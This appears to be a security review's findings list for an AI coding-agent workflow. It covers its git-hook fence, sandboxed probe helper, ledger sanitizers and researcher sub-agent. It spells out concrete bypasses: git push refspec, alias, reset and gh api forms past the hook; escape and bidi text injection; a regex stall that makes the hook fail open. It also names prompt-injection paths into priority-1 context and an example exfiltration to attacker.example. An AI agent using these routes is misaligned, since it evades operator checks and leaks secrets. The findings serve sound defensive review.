findings.title: Untrusted decision text is written to the ledger and later promoted into priority-1 planning context without prompt-injection validation
findings.description: `op_resolve` only sanitizes `--name` and `--line`; it passes `--decision`, `--rationale`, `--evidence`, alternatives, consequences, and `--answer-ref` directly into `dec-write-lib.sh`. `op_handoff` later emits `dw list --source-epic "$SLUG" --format md` into `grimoires/loa/context/chart-<slug>.md`, which `/plan-and-analyze` reads as priority-1 context. A malicious or compromised chart/research input can therefore persist prompt-injection text in a ledger row and have it resurfaced as trusted planning context. Strip/control-normalize all free-text ledger fields, reject instruction-like report content at the handoff boundary, and render ledger rows through the same explicit untrusted-data isolation path used for research reports.
findings.failure_mode: `op_resolve` only sanitizes `--name` and `--line`; it passes `--decision`, `--rationale`, `--evidence`, alternatives, consequences, and `--answer-ref` directly into `dec-write-lib.sh`.

findings.title: Read-only unblock probe boundary is bypassable because arbitrary argv executes with full repository credentials and remotes
findings.description: `chart-unblock-probe.sh` claims to enforce read-only probes by running an arbitrary command in a detached worktree and checking the main tree status afterward. That is not a sandbox: the command can push to remotes, create tags, update refs, read/write `$HOME`, mutate global git config, or explicitly target the main checkout with `git -C <main>`. Those side effects are outside the status comparison and `.run`/`.beads` freshness check. If this helper is allowed as the execution path for `decision:unblock`, it becomes an allowlist bypass for commands that the chart session otherwise should not run. Enforce an explicit read-only command allowlist, disable credentialed network operations, clear dangerous env vars/config, and run probes in a constrained sandbox rather than relying on post-run git status.
findings.failure_mode: `chart-unblock-probe.sh` claims to enforce read-only probes by running an arbitrary command in a detached worktree and checking the main tree status afterward.

findings.cross_file_justification: The charting-decisions SKILL.md allowed-tools entry `Bash(git push -u origin spike/*)` (named in the reviewer scope; the skill file is not in this diff) is a prefix match, so `git push -u origin spike/x:main` is auto-approved with no permission prompt, and SP-1 in the diff-touched hook never inspects push refspecs.
findings.description: SP-1 enforces 'spike content never enters another branch' by blocking merge/rebase/pull/cherry-pick, checkout path copies, restore --source and gh pr create. It does not look at `git push` at all. `git push -u origin spike/x:main`, `git push origin spike/x:refs/heads/feature`, or `git push origin HEAD:main` while checked out on spike/x place the spike head on another remote branch directly, which is the exact invariant D-5.4 states. The documented miss list (show, diff|apply, switch -c, worktree add -b, SHA refs) does not mention push refspecs, and the allowed form `git push -u origin spike/<slug>` is distinguishable from the refspec form only by the colon.
findings.failure_mode: A prompt-injected or mistaken interactive chart session publishes prototype content onto main or a feature branch on the remote with no hook block and, if the allowed-tools glob is as described, no permission prompt. 'Pushed, never merged, no PR' is defeated at the remote where ICE cannot see it.
findings.suggested_fix: Add an SP-1 rule for `git push`: block when any argument contains `:` and either side of the colon matches `_sp1_ref`, and block `HEAD:` / `:<dst>` refspecs when `git rev-parse --abbrev-ref HEAD` is spike/*. Also block `--force`/`-f`/`+refspec` to spike refs. Narrow the skill grant to a shape that cannot carry a colon (e.g. a wrapper `.claude/scripts/spike-push.sh <slug>` that validates the slug and runs the fixed argv) and add fence corpus cases for the refspec forms.

findings.description: Beyond the documented misses, several one-line forms carry spike content past the fence and are not listed: (1) `git fetch origin spike/x && git merge FETCH_HEAD`: the r253-1 narrowing explicitly lets a later segment name spike/ and `fetch` is not a blocked verb, so the FETCH_HEAD class is a two-command bypass, not just a 'SHA' edge. (2) `git -c alias.m=merge m spike/x` or a prior `git config alias.m merge`: `_sp1_git` consumes `-c k=v` but then requires a literal verb. (3) `git reset --soft spike/x`, `git read-tree -u -m spike/x`, `git branch -f feature spike/x`, `git update-ref refs/heads/feature spike/x` all move a non-spike branch onto the spike head. (4) `gh api repos/O/R/pulls -f head=spike/x -f base=main` opens the PR that `gh pr create` refuses. (5) `git checkout --pathspec-from-file=f spike/x` has one operand so `_sp1_checkout_copies` passes. (6) The on-spike `gh pr create` check calls `git rev-parse` in the hook's cwd, so `cd ../other-checkout && gh pr create` reads the wrong HEAD. (7) `ref=spike/x; git merge $ref` is unmatched because the ref is a variable.
findings.failure_mode: In an interactive session (where ICE is not the boundary) spike content reaches another branch or a PR through commands the comment's class list implies are covered; operators relying on the miss list under-estimate exposure.
findings.suggested_fix: Extend the verb set with `fetch`, `reset`, `read-tree`, `update-ref` and `branch -f|--force|-M|-m` when a spike ref follows; block `gh api` whose path ends in `/pulls` with `head=…spike/`; treat `git -c alias.`/`git config alias` as blocked for the git family; resolve HEAD with `git -C <cd target>` when the segment begins with `cd`; and update the miss list to name FETCH_HEAD, reset, read-tree, gh api and variable indirection explicitly.

findings.description: The FR-1.1 unlock allows `git branch -D spike/<slug>` when decisions.yaml holds a `decided` row whose last `→ decided` transition is `by: operator:*`. Three gaps: (a) it never checks that the branch is pushed. The rationale says 'its consequence is a local delete of a pushed spike branch', but nothing verifies `refs/remotes/origin/spike/<slug>` exists and contains the local head, so an unpushed spike (the only case where -D loses work) is exactly what gets unlocked. (b) decisions.yaml is a tracked file the agent edits with Write/Edit (which this Bash hook never sees), and `by: operator:…` is unauthenticated text, so the 'operator-level trust boundary' is agent-writable in practice. (c) The ledger path comes from `git rev-parse --show-toplevel`; inside a linked worktree that is the worktree's checkout, so the row is read from whatever branch the agent has checked out there rather than the main tree's ledger.
findings.failure_mode: The agent writes or edits a decided row (or commits one on a worktree branch) and force-deletes an unpushed spike branch, losing the prototype the decision points to. FR-1.1's purpose ('loses unmerged work') fails for the branch class it unlocks.
findings.suggested_fix: Before `continue`, require `git rev-parse -q --verify refs/remotes/origin/spike/$slug` and `git merge-base --is-ancestor refs/heads/spike/$slug refs/remotes/origin/spike/$slug`. Resolve the ledger from the main tree (`git rev-parse --git-common-dir` parent) or read it from `origin/main:grimoires/loa/decisions.yaml` so a local edit cannot unlock. Optionally require the row's `recorded_by` not be an agent id.

findings.description: `san1` strips control bytes and flattens tab/newline/CR to spaces so each doc line is one line. `section_append` then passes the line via `awk -v line="$2"`, and awk interprets backslash escape sequences in `-v` assignments. A `--line`, `--name` or `--why` value, or a bead title returned by `br show` (used in `op_rule_out`), containing the two-character sequence `\n` becomes a real newline inside `grimoires/loa/maps/<slug>.md`. That inserts arbitrary extra lines, a new `## ` heading or blockquote into the map doc, which `op_handoff` inlines into the priority-1 snapshot. `set_status` uses `-v s=` with fixed values and `jq --arg` paths are unaffected.
findings.failure_mode: The single-line guarantee is bypassed; injected lines land in the map doc and the hand-off snapshot. `validate_map`'s H2 allowlist may catch a heading but not injected bullets, prose or blockquote text, and `op_handoff` does not run the validator anyway.
findings.suggested_fix: Pass the value through the environment: `LINE="$2" awk '... print ENVIRON["LINE"] ...'`, or escape backslashes first (`${2//\\/\\\\}`). Add a test writing `--line 'a\nb'` and asserting the doc has one new line.

findings.description: `op_resolve` sanitizes `--name` and `--line` (san1 + no_url) but passes `--decision`, `--rationale`, `--evidence`, `--alternative-json`, `--consequence-pos/neg` and `--answer-ref` to `dec-write-lib.sh decide` raw; only the br comment `summary` is san1'd. Whether the ledger writer itself strips controls, flattens newlines or bans URLs is not visible in this diff. The reviewer question 'does san1 cover every value that reaches the ledger' is therefore answered no for six fields, and the same rows are later printed into the snapshot by `dw list --format md` in `op_handoff` without the L6 sanitizer.
findings.failure_mode: Multi-line, control-laden or URL-bearing text lands in decisions.yaml and re-appears in `grimoires/loa/context/chart-<slug>.md` as headings or instruction-shaped lines in priority-1 context that `/plan-and-analyze` is told not to question.
findings.suggested_fix: Apply `san1` and `no_url` to `DECISION`, `RATIONALE`, `EVIDENCE`, `CPOS[*]`, `CNEG[*]`, `ANSWER_REF` in `op_resolve`; validate each `--alternative-json` with `jq -e 'type == "object"'` and san1 its string members; add a test asserting `dec-write-lib.sh decide` rejects a value with an embedded newline.

findings.description: Handoff inlines three untrusted bodies into the snapshot: the whole map doc (only heading-demoted by `sed -E 's/^(#+) /#\1 /'`), the ledger rows (`dw list --format md`), and the research reports. Only the reports pass `sanitize_for_session_start L6`. The map doc is not run through `validate_map` (H2 allowlist, URL ban, PII scan) before snapshotting, nothing control-strips the doc or the ledger output, and the resulting tracked file `grimoires/loa/context/chart-<slug>.md` is never PII-scanned. The sed demotion also rewrites `#` lines inside fenced code or blockquotes. If the L6 subshell exits non-zero after emitting partial output, that partial unsanitized text precedes the fallback line. `/plan-and-analyze` consumes the file at priority 1 with 'settled, do not re-ask'.
findings.failure_mode: An injected or PII-carrying string in the 'Not yet specified' section, in a bead title, or in a ledger row is promoted to settled context without any validator seeing it, and is committed in a tracked file.
findings.suggested_fix: In `op_handoff`, run `validate_map` and the PII scanner on `$DOC` and refuse on failure; pass the doc and the `dw list` output through the same L6 sanitizer (or a `tr -d` of controls plus the URL check); PII-scan `$t` before the `mv`; capture the sanitizer output to a temp file and append it only when its exit status is 0.

findings.description: The detached worktree shares the main repository's object database, refs, `.git/config`, `.git/hooks` and remotes, and the probe inherits the session environment (GH_TOKEN, credential helpers, SSH agent). A probe can `git push` any branch, `git tag`, `git update-ref`, set `core.hooksPath` or write `.git/hooks/pre-commit` to gain execution on the operator's next git command, write `~/.gitconfig` or `~/.claude/settings.json`, or fork a background process that writes to the main tree after the `after` snapshot. None of that changes `git status --porcelain` of the main tree, so the helper reports success. The header names home, /tmp and other checkouts as out of bounds but not the shared `.git` directory, refs, pushes or lingering processes. Two further detection gaps: content changes to a tracked file that was already ` M`, or to an untracked file already `??`, leave the status text identical (the header acknowledges this only for ignored files), and `--ticket` is any id string, never checked to be a `question` bead carrying `decision:unblock`. `chart-ticket.sh research-end` shares the same before/after status model.
findings.failure_mode: A hostile or injected probe pushes, rewrites refs, plants a git hook, or edits a dirty file while the helper prints 'main tree unchanged'; if a skill grant auto-approves the helper, this is unprompted arbitrary execution with a false containment signal.
findings.suggested_fix: Snapshot and compare `git for-each-ref`, hashes of `.git/config` and `.git/hooks/*`, `git diff HEAD | sha256sum`, and a whole-tree `find -newer $MARK` (not just .run/.beads). Run the probe with a scrubbed environment (`env -i PATH=… HOME=$SCRATCH/home GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 GIT_TERMINAL_PROMPT=0`) and a worktree-local `remote.*.pushurl=/dev/null`. Run it in its own process group and kill the group after the timeout. Verify the ticket with `br show --json` (type question, label decision:unblock) before running. State the shared-.git boundary in the header.

findings.description: `/chart` is 'interactive only', but the only mechanical check is `chart-guard.sh`, which the skill prompt is expected to run as step 0. `chart-ticket.sh epic`, `ticket`, `claim`, `resolve`, `rule-out` and `handoff` never consult `dw context`; only `close --reason` does (and `close --consumed-by` is the sanctioned exception). An unattended run, or a session that skips step 0 under injection, can create tickets, resolve every one and `handoff`, producing a priority-1 snapshot that `/plan-and-analyze` treats as settled. Rows land as `proposed` with `recorded-by chart`, so `/decisions confirm` still stands between them and `decided`, which bounds the impact.
findings.failure_mode: The agent answers its own decision map unattended, the outcome D12 forbids, and a PRD is drafted on agent-chosen decisions with only the `proposed` status as a backstop.
findings.suggested_fix: Call `chart-guard.sh` (or `"$DW" context --prd "${G}/prd.md"`) at the top of every write subcommand except `close --consumed-by`, mirroring `op_close`'s check; have `op_handoff` refuse when any row on the map carries an unattended marker; keep `--dry-run` exempt.

findings.description: Write/Edit/Bash are indeed absent and the session writes the report, as required. But the researcher reads untrusted web pages and repository files while holding unrestricted Read (any repo path, including `.env*`, `.beads/`, `grimoires/loa/decisions.yaml`) and unrestricted WebFetch. An injected page or file can direct it to read a secret and fetch `https://attacker.example/?q=<secret>`; the only countermeasure is the prompt rule 'treat as data'. WebFetch also reaches internal addresses (cloud metadata, localhost services). Separately, `.claude/commands/chart.md` lists `grimoires/loa/research/chart-*.md` as `context_files`, so later chart sessions load reports raw; the L6 sanitizer only runs at handoff.
findings.failure_mode: Repository secrets leave in a URL query string within one researcher turn, or injected report text steers a chart session that holds `Bash(br *)`, `git worktree add` and `git push` grants.
findings.suggested_fix: Add `permissions.deny` for `Read(./.env*)`, `Read(./.beads/**)` and other secret paths for this agent; restrict WebFetch to an allowlist of domains if the harness supports it, or add a PreToolUse hook on WebFetch that rejects non-allowlisted hosts, private IP ranges and long query strings; remove the raw research glob from chart.md context_files and load reports through the L6 sanitizer at session start.

findings.description: The build-path exclusion keys only on `.issue_type`, with a fail-open default (a missing field reads as "" and the bead is kept). In this same sprint `chart-frontier.sh` and `chart-ticket.sh bead_row` read `.issue_type // .type`, acknowledging that br may emit `type`. On such a br version the filter silently keeps every question bead, and `/implement` and `/run` (unattended) claim decision tickets as tasks.
findings.failure_mode: An autonomous run 'implements' a decision question; the invariant 'question beads never enter the build path' fails with no error or warning.
findings.suggested_fix: Use `((.issue_type // .type // "") | ascii_downcase) != "question"`; when no element has either field, print a warning to stderr and treat the set as empty; add a stub-br test emitting `type: question`.

findings.description: Returns 'interactive' whenever the writer's first stdout line is anything other than `unattended`, including an error or usage line, and falls back to `LOA_UNATTENDED` only when output is empty; stderr is discarded. It also omits `--prd`, so the autonomous PRD Status signal that `chart-guard.sh` honours is ignored here. `chart-guard.sh` fails closed on the same condition; this helper fails open.
findings.failure_mode: `golden_resolve_open_map` returns rc 3 instead of 1 in an unattended run with several maps, so the agent chooses a map itself instead of stopping.
findings.suggested_fix: Treat any first line other than `interactive` as unattended; pass `--prd "${_GP_GRIMOIRE_DIR}/prd.md"`; honour `LOA_UNATTENDED=1` regardless of the writer's verdict.

findings.description: `san1` strips C0 and DEL only; its comment claims C1 as well. UTF-8 C1 (U+0080–U+009F), bidi overrides (U+202A–U+202E, U+2066–U+2069) and zero-width characters pass into bead titles, ledger summaries, map docs and the snapshot. `chart-frontier.sh`'s jq `gsub("[[:cntrl:]]")` covers Cc but not Cf either.
findings.failure_mode: Visually spoofed or hidden text in operator-reviewed map docs and in priority-1 context (e.g. right-to-left override hiding an instruction).
findings.suggested_fix: Add a Unicode-aware pass (`perl -CSD -pe 's/[\p{Cc}\p{Cf}]//g'` or `python3 -I -c` with `unicodedata.category`) after the `tr` step, and correct the comment.

findings.description: The merge span `([[:space:]]+X*)*` is a nested quantifier, contrary to the SP-1 comment ('no nested quantifiers'). A run of k spaces admits 2^(k-1) splits. Whether that is exploitable depends on `_match`'s engine: glibc `=~` and GNU grep are NFA/DFA based and bounded, a backtracking engine is not. Because a PreToolUse hook that exceeds its timeout is non-blocking, a slow match is a fail-open path.
findings.failure_mode: A command with `git merge` followed by thousands of spaces and `spike/` elsewhere stalls the hook past its timeout and the command runs unchecked.
findings.suggested_fix: Collapse whitespace before matching (`tr -s '[:space:]'` on the carrier-scrubbed line) or make each iteration consume exactly one space (`([[:space:]]["']?[^…]*)*`); add a timing corpus case with 10k spaces and assert sub-second completion.

findings.description: The map-epic check handles an array or a bare object but not the `{"issues":[…]}` envelope that `chart-frontier.sh` and `chart-ticket.sh first_obj` handle in the same sprint. On that shape `.labels` is absent, the result is `no`, and a map epic silently accepts a sprint task.
findings.failure_mode: Sprint tasks are created under a `map` epic on a br release that emits the envelope, mixing build work into a decision map.
findings.suggested_fix: Reuse the `first_obj` shape logic (`elif type == "object" and has("issues") then .issues[0]`) and treat an epic with no `labels` key at all as `unknown` rather than `no`.

findings.description: The declarative `context_files` entry loads every hand-off snapshot at priority 1, while the Phase 0 prose says only the resolved map is ingested and 'other snapshots are not ingested'. If the command framework preloads `context_files` mechanically, the multi-map rule (`golden_resolve_open_map --snapshots`, exit 1 unattended) has no effect on what the model actually sees. `chart.md` likewise lists `grimoires/loa/research/chart-*.md`, loading untrusted reports raw.
findings.failure_mode: An unattended run that should have stopped on 'more than one open map' still receives every map's decisions as settled context.
findings.suggested_fix: Remove the globs from `context_files` and read the single chosen snapshot explicitly in Phase 0 after the multi-map rule resolves; load research reports only through the L6 sanitizer.

findings.description: Three small hygiene gaps: `.chart-<slug>-<ticket>.dispatch` markers (a full `git status` listing) are never removed, including after a failed `research-end`, and sit untracked under a tracked directory; `map_rows` reads pending files via `${SCRIPT_DIR}/../../grimoires/loa/a2a/` rather than `$ROOT`, so a `--root` fixture run merges the live tree's agent-proposed pending rows; and the research scope check exempts the entire `grimoires/loa/research/` directory, so any file the session writes there during the ticket passes.
findings.failure_mode: Stale markers get committed or confuse the per-map cap; fixture runs see live data; writes to research/ other than the report are unreported.
findings.suggested_fix: Remove the marker in `research-end` on both success and failure (or add `.chart-*.dispatch` to .gitignore); derive the pending-file glob from `$ROOT`; in the awk filter exempt only the exact report path.
